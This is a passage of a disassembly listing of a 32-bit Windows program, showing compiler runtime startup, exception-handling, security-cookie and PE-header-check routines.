                jnz     short loc_15F2B
                mov     eax, 8007000Eh
                jmp     short loc_15F39
; ---------------------------------------------------------------------------

loc_15F2B:                              ; CODE XREF: sub_15EF0+32↑j
                push    eax
                call    dword ptr ds:100126Ch
                jmp     short loc_15F39
; ---------------------------------------------------------------------------

loc_15F34:                              ; CODE XREF: sub_15EF0+18↑j
                                        ; sub_15EF0+1E↑j
                mov     eax, 80070057h

loc_15F39:                              ; CODE XREF: sub_15EF0+12↑j
                                        ; sub_15EF0+39↑j ...
                pop     esi
                pop     ebp
                retn    8
sub_15EF0       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_15F43       proc near               ; CODE XREF: sub_158A7+307↑p
                mov     edi, edi
                push    esi
                mov     esi, ecx
                xor     eax, eax
                cmp     [esi], eax
                jz      short loc_15F69
                push    dword ptr [esi]
                call    dword ptr ds:1001278h
                test    eax, eax
                js      short loc_15F69
                push    dword ptr [esi]
                call    dword ptr ds:1001260h
                test    eax, eax
                js      short loc_15F69
                and     dword ptr [esi], 0

loc_15F69:                              ; CODE XREF: sub_15F43+9↑j
                                        ; sub_15F43+15↑j ...
                pop     esi
                retn
sub_15F43       endp

; ---------------------------------------------------------------------------
                align 10h
                push    1005BE6h
                call    sub_16461
                mov     eax, ds:100C6C0h
                mov     dword ptr [esp], 100C38Ch
                push    dword ptr ds:100C6BCh
                mov     ds:100C38Ch, eax
                push    100C37Ch
                push    100C380h
                push    100C378h
                call    dword ptr ds:10011C4h
                add     esp, 14h
                mov     ds:100C388h, eax
                test    eax, eax
                jns     short locret_15FBA
                push    8
                call    sub_16808
                pop     ecx

locret_15FBA:                           ; CODE XREF: CODE:00015FB0↑j
                retn
; ---------------------------------------------------------------------------
                align 10h

loc_15FC0:                              ; CODE XREF: CODE:0001625A↓j
                push    5Ch ; '\'
                push    100A9B0h
                call    sub_169E8
                xor     ebx, ebx
                mov     [ebp-1Ch], ebx
                lea     eax, [ebp-6Ch]
                push    eax
                call    dword ptr ds:1001130h
                cmp     ds:100D9A0h, ebx
                jnz     short loc_15FEE
                push    ebx
                push    ebx
                push    1
                push    ebx
                call    dword ptr ds:1001158h

loc_15FEE:                              ; CODE XREF: CODE:00015FE1↑j
                mov     [ebp-4], ebx
                mov     eax, large fs:18h
                mov     esi, [eax+4]
                mov     [ebp-20h], ebx
                mov     edi, 100D994h

loc_16002:                              ; CODE XREF: CODE:00016026↓j
                push    ebx
                push    esi
                push    edi
                call    dword ptr ds:1001134h
                cmp     eax, ebx
                jz      short loc_16028
                cmp     eax, esi
                jnz     short loc_1601B
                xor     esi, esi
                inc     esi
                mov     [ebp-20h], esi
                jmp     short loc_1602B
; ---------------------------------------------------------------------------

loc_1601B:                              ; CODE XREF: CODE:00016011↑j
                push    3E8h
                call    dword ptr ds:1001050h
                jmp     short loc_16002
; ---------------------------------------------------------------------------

loc_16028:                              ; CODE XREF: CODE:0001600D↑j
                xor     esi, esi
                inc     esi

loc_1602B:                              ; CODE XREF: CODE:00016019↑j
                mov     eax, ds:100D990h
                cmp     eax, esi
                jnz     short loc_1603E
                push    1Fh
                call    sub_16808
                pop     ecx
                jmp     short loc_16079
; ---------------------------------------------------------------------------

loc_1603E:                              ; CODE XREF: CODE:00016032↑j
                mov     eax, ds:100D990h
                test    eax, eax
                jnz     short loc_16073
                mov     ds:100D990h, esi
                push    1001308h
                push    10012FCh
                call    sub_169D6
                pop     ecx
                pop     ecx
                test    eax, eax
                jz      short loc_16079
                mov     dword ptr [ebp-4], 0FFFFFFFEh
                mov     eax, 0FFh
                jmp     loc_1618B
; ---------------------------------------------------------------------------

loc_16073:                              ; CODE XREF: CODE:00016045↑j
                mov     ds:100C394h, esi

loc_16079:                              ; CODE XREF: CODE:0001603C↑j
                                        ; CODE:00016060↑j
                mov     eax, ds:100D990h
                cmp     eax, esi
                jnz     short loc_1609D
                push    10012F8h
                push    10012D8h
                call    sub_169CA
                pop     ecx
                pop     ecx
                mov     dword ptr ds:100D990h, 2

loc_1609D:                              ; CODE XREF: CODE:00016080↑j
                cmp     [ebp-20h], ebx
                jnz     short loc_160AA
                push    ebx
                push    edi
                call    dword ptr ds:100116Ch

loc_160AA:                              ; CODE XREF: CODE:000160A0↑j
                cmp     ds:100D9A4h, ebx
                jz      short loc_160CB
                push    100D9A4h
                call    sub_16908
                pop     ecx
                test    eax, eax
                jz      short loc_160CB
                push    ebx
                push    2
                push    ebx
                call    dword ptr ds:100D9A4h

loc_160CB:                              ; CODE XREF: CODE:000160B0↑j
                                        ; CODE:000160BF↑j
                mov     eax, ds:10011D8h
                mov     eax, [eax]

loc_160D2:                              ; CODE XREF: CODE:0001613F↓j
                mov     [ebp-24h], eax
                movzx   ecx, word ptr [eax]
                cmp     ecx, 20h ; ' '
                ja      short loc_1612C
                cmp     cx, bx
                jz      short loc_160E7
                cmp     [ebp-1Ch], ebx
                jnz     short loc_1612C

loc_160E7:                              ; CODE XREF: CODE:000160E0↑j
                                        ; CODE:000160FA↓j
                movzx   ecx, word ptr [eax]
                cmp     cx, bx
                jz      short loc_160FC
                cmp     ecx, 20h ; ' '
                ja      short loc_160FC
                add     eax, 2
                mov     [ebp-24h], eax
                jmp     short loc_160E7
; ---------------------------------------------------------------------------

loc_160FC:                              ; CODE XREF: CODE:000160ED↑j
                                        ; CODE:000160F2↑j
                test    byte ptr [ebp-40h], 1
                jz      short loc_16108
                movzx   ecx, word ptr [ebp-3Ch]
                jmp     short loc_1610B
; ---------------------------------------------------------------------------

loc_16108:                              ; CODE XREF: CODE:00016100↑j
                push    0Ah
                pop     ecx

loc_1610B:                              ; CODE XREF: CODE:00016106↑j
                push    ecx
                push    eax
                push    ebx
                push    1000000h
                call    sub_1386A
                mov     ds:100C390h, eax
                cmp     ds:100C384h, ebx
                jnz     short loc_16171
                push    eax
                call    dword ptr ds:10011D4h

loc_1612C:                              ; CODE XREF: CODE:000160DB↑j
                                        ; CODE:000160E5↑j
                cmp     ecx, 22h ; '"'
                jnz     short loc_1613C
                xor     ecx, ecx
                cmp     [ebp-1Ch], ebx
                setz    cl
                mov     [ebp-1Ch], ecx

loc_1613C:                              ; CODE XREF: CODE:0001612F↑j
                add     eax, 2
                jmp     short loc_160D2
; ---------------------------------------------------------------------------
                mov     eax, [ebp-14h]
                mov     ecx, [eax]
                mov     ecx, [ecx]
                mov     [ebp-28h], ecx
                push    eax
                push    ecx
                call    sub_1686A
                pop     ecx
                pop     ecx
                retn
; ---------------------------------------------------------------------------
                mov     esp, [ebp-18h]
                mov     eax, [ebp-28h]
                mov     ds:100C390h, eax
                xor     ebx, ebx
                cmp     ds:100C384h, ebx
                jnz     short loc_16171
                push    eax
                call    dword ptr ds:10011CCh

loc_16171:                              ; CODE XREF: CODE:00016123↑j
                                        ; CODE:00016168↑j
                cmp     ds:100C394h, ebx
                jnz     short loc_1617F
                call    dword ptr ds:10011C8h

loc_1617F:                              ; CODE XREF: CODE:00016177↑j
                mov     dword ptr [ebp-4], 0FFFFFFFEh
                mov     eax, ds:100C390h

loc_1618B:                              ; CODE XREF: CODE:0001606E↑j
                call    sub_16A2D
                retn
; ---------------------------------------------------------------------------
                db 5 dup(0CCh)
; ---------------------------------------------------------------------------
                mov     eax, 5A4Dh
                cmp     ds:1000000h, ax
                jz      short loc_161A8

loc_161A4:                              ; CODE XREF: CODE:000161B7↓j
                                        ; CODE:000161C5↓j ...
                xor     eax, eax
                jmp     short loc_161DD
; ---------------------------------------------------------------------------

loc_161A8:                              ; CODE XREF: CODE:000161A2↑j
                mov     eax, ds:100003Ch
                cmp     dword ptr [eax+1000000h], 4550h
                jnz     short loc_161A4
                mov     ecx, 10Bh
                cmp     [eax+1000018h], cx
                jnz     short loc_161A4
                cmp     dword ptr [eax+1000074h], 0Eh
                jbe     short loc_161A4
                xor     ecx, ecx
                cmp     [eax+10000E8h], ecx
                setnz   cl
                mov     eax, ecx

loc_161DD:                              ; CODE XREF: CODE:000161A6↑j
                push    2
                mov     ds:100C384h, eax
                call    dword ptr ds:1001208h
                pop     ecx
                push    0FFFFFFFFh
                call    dword ptr ds:100112Ch
                mov     ecx, ds:100C6C8h
                mov     ds:100D998h, eax
                mov     ds:100D99Ch, eax
                mov     eax, ds:1001204h
                mov     [eax], ecx
                mov     eax, ds:10011ECh
                mov     ecx, ds:100C6C4h
                mov     [eax], ecx
                call    sub_16813
                call    sub_16A7B
                cmp     dword ptr ds:100C0A4h, 0
                jnz     short loc_16236
                push    1005E1Bh
                call    dword ptr ds:10011E8h
                pop     ecx

loc_16236:                              ; CODE XREF: CODE:00016228↑j
                call    sub_16A46
                cmp     dword ptr ds:100C0A0h, 0FFFFFFFFh
                jnz     short loc_1624D
                push    0FFFFFFFFh
                call    dword ptr ds:10011E4h
                pop     ecx

loc_1624D:                              ; CODE XREF: CODE:00016242↑j
                xor     eax, eax
                retn
; ---------------------------------------------------------------------------
                db 5 dup(0CCh)
; ---------------------------------------------------------------------------
                call    sub_16A83
                jmp     loc_15FC0
; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_16264       proc near               ; CODE XREF: sub_14318+1D↑p
                                        ; sub_14368+42↑p ...
                jmp     dword ptr ds:10011BCh
sub_16264       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_1626F       proc near               ; CODE XREF: sub_1475E+8E↑p
                push    10h
                push    100A9D0h
                call    sub_169E8
                xor     eax, eax
                mov     [ebp-20h], eax
                mov     [ebp-4], eax
                mov     [ebp-1Ch], eax

loc_16286:                              ; CODE XREF: sub_1626F+30↓j
                mov     eax, [ebp-1Ch]
                cmp     eax, [ebp+10h]
                jge     short loc_162A1
                mov     esi, [ebp+8]
                mov     ecx, esi
                call    dword ptr [ebp+14h]
                add     esi, [ebp+0Ch]
                mov     [ebp+8], esi
                inc     dword ptr [ebp-1Ch]
                jmp     short loc_16286
; ---------------------------------------------------------------------------

loc_162A1:                              ; CODE XREF: sub_1626F+1D↑j
                mov     dword ptr [ebp-20h], 1
                mov     dword ptr [ebp-4], 0FFFFFFFEh
                call    sub_162BC
                call    sub_16A2D
                retn    14h
sub_1626F       endp ; sp-analysis failed


; =============== S U B R O U T I N E =======================================


sub_162BC       proc near               ; CODE XREF: sub_1626F+40↑p
                cmp     dword ptr [ebp-20h], 0
                jnz     short locret_162D3
                push    dword ptr [ebp+18h]
                push    dword ptr [ebp-1Ch]
                push    dword ptr [ebp+0Ch]
                push    dword ptr [ebp+8]
                call    sub_162D9

locret_162D3:                           ; CODE XREF: sub_162BC+4↑j
                retn
sub_162BC       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_162D9       proc near               ; CODE XREF: sub_162BC+12↑p
                                        ; sub_16387+12↓p
                push    14h
                push    100A9F0h
                call    sub_169E8
                and     dword ptr [ebp-4], 0

loc_162E9:                              ; CODE XREF: sub_162D9+21↓j
                dec     dword ptr [ebp+10h]
                js      short loc_16328
                mov     ecx, [ebp+8]
                sub     ecx, [ebp+0Ch]
                mov     [ebp+8], ecx
                call    dword ptr [ebp+14h]
                jmp     short loc_162E9
; ---------------------------------------------------------------------------
                mov     eax, [ebp-14h]
                mov     [ebp-1Ch], eax
                mov     eax, [ebp-1Ch]
                mov     eax, [eax]
                mov     [ebp-20h], eax
                mov     eax, [ebp-20h]
                cmp     dword ptr [eax], 0E06D7363h
                jz      short loc_16320
                mov     dword ptr [ebp-24h], 0
                mov     eax, [ebp-24h]
                retn
; ---------------------------------------------------------------------------

loc_16320:                              ; CODE XREF: sub_162D9+3A↑j
                call    sub_16B24
                mov     esp, [ebp-18h]

loc_16328:                              ; CODE XREF: sub_162D9+13↑j
                mov     dword ptr [ebp-4], 0FFFFFFFEh
                call    sub_16A2D
                retn    10h
sub_162D9       endp ; sp-analysis failed

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_1633C       proc near               ; CODE XREF: sub_14368+1C↑p
                                        ; sub_16751+1C↓p
                push    0Ch
                push    100AA10h
                call    sub_169E8
                and     dword ptr [ebp-1Ch], 0
                mov     esi, [ebp+0Ch]
                mov     eax, esi
                imul    eax, [ebp+10h]
                add     [ebp+8], eax
                and     dword ptr [ebp-4], 0

loc_1635C:                              ; CODE XREF: sub_1633C+2E↓j
                dec     dword ptr [ebp+10h]
                js      short loc_1636C
                sub     [ebp+8], esi
                mov     ecx, [ebp+8]
                call    dword ptr [ebp+14h]
                jmp     short loc_1635C
; ---------------------------------------------------------------------------

loc_1636C:                              ; CODE XREF: sub_1633C+23↑j
                mov     dword ptr [ebp-1Ch], 1
                mov     dword ptr [ebp-4], 0FFFFFFFEh
                call    sub_16387
                call    sub_16A2D
                retn    10h
sub_1633C       endp ; sp-analysis failed


; =============== S U B R O U T I N E =======================================


sub_16387       proc near               ; CODE XREF: sub_1633C+3E↑p
                cmp     dword ptr [ebp-1Ch], 0
                jnz     short locret_1639E
                push    dword ptr [ebp+14h]
                push    dword ptr [ebp+10h]
                push    dword ptr [ebp+0Ch]
                push    dword ptr [ebp+8]
                call    sub_162D9

locret_1639E:                           ; CODE XREF: sub_16387+4↑j
                retn
sub_16387       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)
; ---------------------------------------------------------------------------
                jmp     dword ptr ds:10011B8h
; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_163B0       proc near               ; CODE XREF: sub_1556A+32↑p
                                        ; sub_156ED+32↑p
                jmp     dword ptr ds:10011B4h
sub_163B0       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_163BB       proc near               ; CODE XREF: sub_16461+8↓p
                push    14h
                push    100AA30h
                call    sub_169E8
                push    dword ptr ds:100D99Ch
                mov     esi, ds:1001128h
                call    esi
                mov     [ebp-1Ch], eax
                cmp     eax, 0FFFFFFFFh
                jnz     short loc_163E9
                push    dword ptr [ebp+8]
                call    dword ptr ds:100121Ch
                pop     ecx
                jmp     short loc_1644D
; ---------------------------------------------------------------------------

loc_163E9:                              ; CODE XREF: sub_163BB+20↑j
                push    8
                call    sub_16B48
                pop     ecx
                and     dword ptr [ebp-4], 0
                push    dword ptr ds:100D99Ch
                call    esi
                mov     [ebp-1Ch], eax
                push    dword ptr ds:100D998h
                call    esi
                mov     [ebp-20h], eax
                lea     eax, [ebp-20h]
                push    eax
                lea     eax, [ebp-1Ch]
                push    eax
                push    dword ptr [ebp+8]
                mov     esi, ds:100112Ch
                call    esi
                push    eax
                call    sub_16B3C
                add     esp, 0Ch
                mov     [ebp-24h], eax
                push    dword ptr [ebp-1Ch]
                call    esi
                mov     ds:100D99Ch, eax
                push    dword ptr [ebp-20h]
                call    esi
                mov     ds:100D998h, eax
                mov     dword ptr [ebp-4], 0FFFFFFFEh
                call    sub_16453
                mov     eax, [ebp-24h]

loc_1644D:                              ; CODE XREF: sub_163BB+2C↑j
                call    sub_16A2D
                retn
sub_163BB       endp


; =============== S U B R O U T I N E =======================================


sub_16453       proc near               ; CODE XREF: sub_163BB+8A↑p
                push    8
                call    sub_16B30
                pop     ecx
                retn
sub_16453       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_16461       proc near               ; CODE XREF: CODE:00015F75↑p
                                        ; CODE:0001B2E8↓p ...

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    [ebp+arg_0]
                call    sub_163BB
                neg     eax
                sbb     eax, eax
                neg     eax
                pop     ecx
                dec     eax
                pop     ebp
                retn
sub_16461       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_1647D       proc near               ; CODE XREF: sub_13B58:loc_13C6E↑p
                                        ; sub_165AB:loc_165B5↓j

var_328         = dword ptr -328h
var_324         = dword ptr -324h
var_320         = dword ptr -320h
var_s0          = dword ptr  0
arg_0           = byte ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 328h
                mov     ds:100C4A0h, eax
                mov     ds:100C49Ch, ecx
                mov     ds:100C498h, edx
                mov     ds:100C494h, ebx
                mov     ds:100C490h, esi
                mov     ds:100C48Ch, edi
                mov     word ptr ds:100C4B8h, ss
                mov     word ptr ds:100C4ACh, cs
                mov     word ptr ds:100C488h, ds
                mov     word ptr ds:100C484h, es
                mov     word ptr ds:100C480h, fs
                mov     word ptr ds:100C47Ch, gs
                pushf
                pop     dword ptr ds:100C4B0h
                mov     eax, [ebp+var_s0]
                mov     ds:100C4A4h, eax
                mov     eax, [ebp+4]
                mov     ds:100C4A8h, eax
                lea     eax, [ebp+arg_0]
                mov     ds:100C4B4h, eax
                mov     eax, [ebp+var_320]
                mov     dword ptr ds:100C3F0h, offset byte_10001
                mov     eax, ds:100C4A8h
                mov     ds:100C3A4h, eax
                mov     dword ptr ds:100C398h, 0C0000409h
                mov     dword ptr ds:100C39Ch, 1
                mov     eax, ds:100C088h
                mov     [ebp+var_328], eax
                mov     eax, ds:100C08Ch
                mov     [ebp+var_324], eax
                call    dword ptr ds:1001120h
                mov     ds:100C3E8h, eax
                push    1
                call    sub_16B54
                pop     ecx
                push    0
                call    dword ptr ds:1001150h
                push    10017B0h
                call    dword ptr ds:1001124h
                cmp     dword ptr ds:100C3E8h, 0
                jnz     short loc_1656F
                push    1
                call    sub_16B54
                pop     ecx

loc_1656F:                              ; CODE XREF: sub_1647D+E8↑j
                push    0C0000409h
                call    dword ptr ds:1001070h
                push    eax
                call    dword ptr ds:100107Ch
                leave
                retn
sub_1647D       endp

; ---------------------------------------------------------------------------
                align 8

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_16588       proc near               ; CODE XREF: CODE:00016B9B↓p
                jmp     dword ptr ds:10011B0h
sub_16588       endp

; ---------------------------------------------------------------------------
                db 6 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_16594       proc near               ; CODE XREF: sub_1475E+64↑p
                jmp     dword ptr ds:10011ACh
sub_16594       endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_165A0       proc near               ; CODE XREF: sub_14368+28↑p
                                        ; CODE:0001B1E8↓p
                jmp     dword ptr ds:10011A8h
sub_165A0       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_165AB       proc near               ; CODE XREF: sub_13B58+18A↑p
                                        ; sub_1510E+97↑p ...
                cmp     ecx, ds:100C088h
                jnz     short loc_165B5
                rep retn
; ---------------------------------------------------------------------------

loc_165B5:                              ; CODE XREF: sub_165AB+6↑j
                jmp     sub_1647D
sub_165AB       endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_165C0       proc near               ; CODE XREF: sub_1393A+14↑p
                jmp     dword ptr ds:1001194h
sub_165C0       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_165CB       proc near               ; CODE XREF: sub_15CAB+7↑p
                                        ; CODE:0001AD6A↓p

arg_0           = byte ptr  4

                push    eax
                push    large dword ptr fs:0
                lea     eax, [esp+8+arg_0]
                sub     esp, [esp+0Ch]
                push    ebx
                push    esi
                push    edi
                mov     [eax], ebp
                mov     ebp, eax
                mov     eax, ds:100C088h
                xor     eax, ebp
                push    eax
                push    dword ptr [ebp-4]
                mov     dword ptr [ebp-4], 0FFFFFFFFh
                lea     eax, [ebp-0Ch]
                mov     large fs:0, eax
                retn
sub_165CB       endp ; sp-analysis failed

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_16603       proc near               ; CODE XREF: sub_1475E+7↑p
                                        ; sub_1556A+7↑p ...

arg_0           = byte ptr  4

                push    eax
                push    large dword ptr fs:0
                lea     eax, [esp+8+arg_0]
                sub     esp, [esp+0Ch]
                push    ebx
                push    esi
                push    edi
                mov     [eax], ebp
                mov     ebp, eax
                mov     eax, ds:100C088h
                xor     eax, ebp
                push    eax
                mov     [ebp-10h], esp
                push    dword ptr [ebp-4]
                mov     dword ptr [ebp-4], 0FFFFFFFFh
                lea     eax, [ebp-0Ch]
                mov     large fs:0, eax
                retn
sub_16603       endp ; sp-analysis failed

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_1663E       proc near               ; CODE XREF: sub_14403+A↑p

arg_0           = byte ptr  4

                push    eax
                push    large dword ptr fs:0
                lea     eax, [esp+8+arg_0]
                sub     esp, [esp+0Ch]
                push    ebx
                push    esi
                push    edi
                mov     [eax], ebp
                mov     ebp, eax
                mov     eax, ds:100C088h
                xor     eax, ebp
                push    eax
                mov     [ebp-10h], eax
                push    dword ptr [ebp-4]
                mov     dword ptr [ebp-4], 0FFFFFFFFh
                lea     eax, [ebp-0Ch]
                mov     large fs:0, eax
                retn
sub_1663E       endp ; sp-analysis failed

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_16679       proc near               ; CODE XREF: sub_1475E:loc_148E7↑p
                                        ; sub_1556A:loc_15608↑p ...
                mov     ecx, [ebp-0Ch]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     edi
                pop     esi
                pop     ebx
                mov     esp, ebp
                pop     ebp
                push    ecx
                retn
sub_16679       endp ; sp-analysis failed

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_16692       proc near               ; CODE XREF: sub_14403:loc_1460F↑p
                mov     ecx, [ebp-10h]
                xor     ecx, ebp
                call    sub_165AB
                jmp     sub_16679
sub_16692       endp

; ---------------------------------------------------------------------------
                align 8

; =============== S U B R O U T I N E =======================================


sub_166A8       proc near               ; CODE XREF: sub_14A83+A↑p

arg_4           = dword ptr  8

                push    1005AB7h
                push    large dword ptr fs:0
                mov     eax, [esp+8+arg_4]
                mov     [esp+8+arg_4], ebp
                lea     ebp, [esp+8+arg_4]
                sub     esp, eax
                push    ebx
                push    esi
                push    edi
                mov     eax, ds:100C088h
                xor     [ebp-4], eax
                xor     eax, ebp
                mov     [ebp-1Ch], eax
                push    eax
                mov     [ebp-18h], esp
                push    dword ptr [ebp-8]
                mov     eax, [ebp-4]
                mov     dword ptr [ebp-4], 0FFFFFFFEh
                mov     [ebp-8], eax
                lea     eax, [ebp-10h]
                mov     large fs:0, eax
                retn
sub_166A8       endp ; sp-analysis failed


; =============== S U B R O U T I N E =======================================


sub_166F0       proc near               ; CODE XREF: sub_14A83+270↑p
                mov     ecx, [ebp-1Ch]
                xor     ecx, ebp
                call    sub_165AB
                jmp     sub_16A2D
sub_166F0       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)
; ---------------------------------------------------------------------------

loc_16704:                              ; CODE XREF: CODE:0001B1DB↓j
                                        ; CODE:0001B20D↓j ...
                jmp     dword ptr ds:1001190h
; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_1670F       proc near

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    [ebp+arg_C]
                push    [ebp+arg_8]
                push    [ebp+arg_4]
                push    [ebp+arg_0]
                push    1005953h
                push    100C088h
                call    sub_16B60
                add     esp, 18h
                pop     ebp
                retn
sub_1670F       endp

; ---------------------------------------------------------------------------
                db 6 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_1673A       proc near               ; CODE XREF: sub_14656+6E↑p
                jmp     dword ptr ds:100118Ch
sub_1673A       endp

; ---------------------------------------------------------------------------
                db 6 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_16746       proc near               ; CODE XREF: sub_14D5F+33↑p
                                        ; sub_16BB3+F↓p ...
                jmp     dword ptr ds:1001188h
sub_16746       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_16751       proc near

arg_0           = byte ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                test    [ebp+arg_0], 2
                push    edi
                mov     edi, ecx
                jz      short loc_16784
                push    esi
                push    1005F2Ch
                lea     esi, [edi-4]
                push    dword ptr [esi]
                push    0Ch
                push    edi
                call    sub_1633C
                test    [ebp+arg_0], 1
                jz      short loc_1677F
                push    esi
                call    sub_16264
                pop     ecx

loc_1677F:                              ; CODE XREF: sub_16751+25↑j
                mov     eax, esi
                pop     esi
                jmp     short loc_16798
; ---------------------------------------------------------------------------

loc_16784:                              ; CODE XREF: sub_16751+C↑j
                call    sub_16B84
                test    [ebp+arg_0], 1
                jz      short loc_16796
                push    edi
                call    sub_16264
                pop     ecx

loc_16796:                              ; CODE XREF: sub_16751+3C↑j
                mov     eax, edi

loc_16798:                              ; CODE XREF: sub_16751+31↑j
                pop     edi
                pop     ebp
                retn    4
sub_16751       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_167A2       proc near               ; CODE XREF: sub_158A7+1EF↑p
                jmp     dword ptr ds:10011A0h
sub_167A2       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_167AD       proc near

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                mov     eax, [eax]
                cmp     dword ptr [eax], 0E06D7363h
                jnz     short loc_167E9
                cmp     dword ptr [eax+10h], 3
                jnz     short loc_167E9
                mov     eax, [eax+14h]
                cmp     eax, 19930520h
                jz      short loc_167E4
                cmp     eax, 19930521h
                jz      short loc_167E4
                cmp     eax, 19930522h
                jz      short loc_167E4
                cmp     eax, 1994000h
                jnz     short loc_167E9

loc_167E4:                              ; CODE XREF: sub_167AD+20↑j
                                        ; sub_167AD+27↑j ...
                call    sub_16B24

loc_167E9:                              ; CODE XREF: sub_167AD+10↑j
                                        ; sub_167AD+16↑j ...
                xor     eax, eax
                pop     ebp
                retn    4
sub_167AD       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)
; ---------------------------------------------------------------------------
                push    1005B55h
                call    dword ptr ds:1001150h
                xor     eax, eax
                retn
; ---------------------------------------------------------------------------
                align 8

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_16808       proc near               ; CODE XREF: CODE:00015FB4↑p
                                        ; CODE:00016036↑p
                jmp     dword ptr ds:10011C0h
sub_16808       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_16813       proc near               ; CODE XREF: CODE:00016217↑p
                mov     edi, edi
                push    esi
                mov     eax, 1002AA4h
                mov     esi, 1002AA4h
                push    edi
                mov     edi, eax
                cmp     eax, esi
                jnb     short loc_16836

loc_16827:                              ; CODE XREF: sub_16813+21↓j
                mov     eax, [edi]
                test    eax, eax
                jz      short loc_1682F
                call    eax

loc_1682F:                              ; CODE XREF: sub_16813+18↑j
                add     edi, 4
                cmp     edi, esi
                jb      short loc_16827

loc_16836:                              ; CODE XREF: sub_16813+12↑j
                pop     edi
                pop     esi
                retn
sub_16813       endp

; ---------------------------------------------------------------------------
                align 10h
                push    esi
                mov     eax, 1002AACh
                mov     esi, 1002AACh
                push    edi
                mov     edi, eax
                cmp     eax, esi
                jnb     short loc_16861

loc_16852:                              ; CODE XREF: CODE:0001685F↓j
                mov     eax, [edi]
                test    eax, eax
                jz      short loc_1685A
                call    eax

loc_1685A:                              ; CODE XREF: CODE:00016856↑j
                add     edi, 4
                cmp     edi, esi
                jb      short loc_16852

loc_16861:                              ; CODE XREF: CODE:00016850↑j
                pop     edi
                pop     esi
                retn
; ---------------------------------------------------------------------------
                db 6 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_1686A       proc near               ; CODE XREF: CODE:0001614D↑p
                jmp     dword ptr ds:10011D0h
sub_1686A       endp

; ---------------------------------------------------------------------------
                db 8 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_16878       proc near               ; CODE XREF: sub_16908+41↓p

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     ecx, [ebp+arg_0]
                mov     eax, 5A4Dh
                cmp     [ecx], ax
                jz      short loc_1688E

loc_1688A:                              ; CODE XREF: sub_16878+21↓j
                xor     eax, eax
                pop     ebp
                retn
; ---------------------------------------------------------------------------

loc_1688E:                              ; CODE XREF: sub_16878+10↑j
                mov     eax, [ecx+3Ch]
                add     eax, ecx
                cmp     dword ptr [eax], 4550h
                jnz     short loc_1688A
                xor     edx, edx
                mov     ecx, 10Bh
                cmp     [eax+18h], cx
                setz    dl
                mov     eax, edx
                pop     ebp
                retn
sub_16878       endp

; ---------------------------------------------------------------------------
                db 0Bh dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_168B8       proc near               ; CODE XREF: sub_16908+5B↓p

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                mov     ecx, [eax+3Ch]
                add     ecx, eax
                movzx   eax, word ptr [ecx+14h]
                push    ebx
                push    esi
                movzx   esi, word ptr [ecx+6]
